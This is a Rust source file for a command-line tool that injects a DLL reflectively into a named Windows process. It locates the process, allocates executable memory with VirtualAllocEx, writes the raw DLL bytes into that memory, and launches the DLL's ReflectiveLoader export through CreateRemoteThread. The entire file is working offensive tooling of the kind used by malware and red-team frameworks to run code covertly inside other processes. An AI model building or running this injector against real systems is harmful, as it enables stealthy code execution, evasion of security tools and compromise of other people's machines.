use clap::Parser;
use goblin::pe::PE;
use std::fs;
use std::path::PathBuf;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to the DLL to inject
    #[arg(short, long)]
    dll: PathBuf,

    /// Name of the target process (e.g., notepad.exe)
    #[arg(short, long)]
    target: String,
}

fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) != 0 {
            let target_name = process_name.to_lowercase();
            loop {
                let current_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy()
                    .to_lowercase();
                if current_name == target_name {
                    CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if Process32Next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
    }
    None
}

fn is_process_64bit(h_process: HANDLE) -> bool {
    let mut is_wow64: BOOL = 0;
    unsafe {
        if IsWow64Process(h_process, &mut is_wow64) == 0 {
            return false;
        }
    }
    is_wow64 == 0
}

fn main() {
    let args = Args::parse();
    println!("[*] Reflective Injector: {} into {}...", args.dll.display(), args.target);

    let pid = match get_process_id_by_name(&args.target) {
        Some(pid) => pid,
        None => {
            eprintln!("[-] Could not find process: {}", args.target);
            return;
        }
    };
    println!("[+] Found process {} with PID: {}", args.target, pid);

    let dll_bytes = match fs::read(&args.dll) {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("[-] Could not read DLL file: {}", e);
            return;
        }
    };

    let pe = match PE::parse(&dll_bytes) {
        Ok(pe) => pe,
        Err(e) => {
            eprintln!("[-] Could not parse DLL: {}", e);
            return;
        }
    };

    if !pe.is_64 {
        eprintln!("[-] DLL is not 64-bit. This injector only supports x64.");
        return;
    }

    // Find the ReflectiveLoader export by name
    let loader_offset = match pe.exports.iter().find(|e| e.name.as_deref().map_or(false, |n| n.contains("ReflectiveLoader"))) {
        Some(export) => export.offset,
        None => {
            eprintln!("[-] DLL does not export ReflectiveLoader. Ensure the DLL implements Stephen Fewer's ReflectiveLoader.");
            return;
        }
    };

    if loader_offset.is_none() {
        eprintln!("[-] ReflectiveLoader export has no file offset. Ensure it is a valid PE export.");
        return;
    }

    unsafe {
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            0,
            pid,
        );

        if process_handle == 0 {
            eprintln!("[-] Could not open target process: {}", GetLastError());
            return;
        }

        if !is_process_64bit(process_handle) {
            eprintln!("[-] Target process is not 64-bit. This injector only supports x64.");
            CloseHandle(process_handle);
            return;
        }

        // Allocate memory for the RAW DLL bytes in the target process.
        // Stephen Fewer's ReflectiveLoader handles mapping itself from the raw bytes.
        let remote_buffer = VirtualAllocEx(
            process_handle,
            std::ptr::null(),
            dll_bytes.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_buffer.is_null() {
            eprintln!("[-] Could not allocate memory in target process: {}", GetLastError());
            CloseHandle(process_handle);
            return;
        }

        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_handle,
            remote_buffer,
            dll_bytes.as_ptr() as *const _,
            dll_bytes.len(),
            &mut bytes_written,
        );

        if write_result == 0 || bytes_written != dll_bytes.len() {
            eprintln!("[-] Could not write raw DLL to target process: {}", GetLastError());
            VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
            CloseHandle(process_handle);
            return;
        }

        // Calculate the thread entry point using the ReflectiveLoader's FILE OFFSET.
        // The loader's code will be executed starting from its offset within the raw bytes.
        let thread_start_routine = std::mem::transmute(remote_buffer as usize + loader_offset.unwrap() as usize);
        let mut thread_id = 0;
        let thread_handle = CreateRemoteThread(
            process_handle,
            std::ptr::null(),
            0,
            thread_start_routine,
            remote_buffer, // Stephen Fewer's reflective loader expects the base address of the raw DLL buffer as the parameter.
            0,
            &mut thread_id,
        );

        if thread_handle == 0 {
            eprintln!("[-] Could not create remote thread: {}", GetLastError());
            VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
        } else {
            println!("[+] Successfully initiated reflective injection! Thread ID: {}", thread_id);
            CloseHandle(thread_handle);
        }

        CloseHandle(process_handle);
    }
}
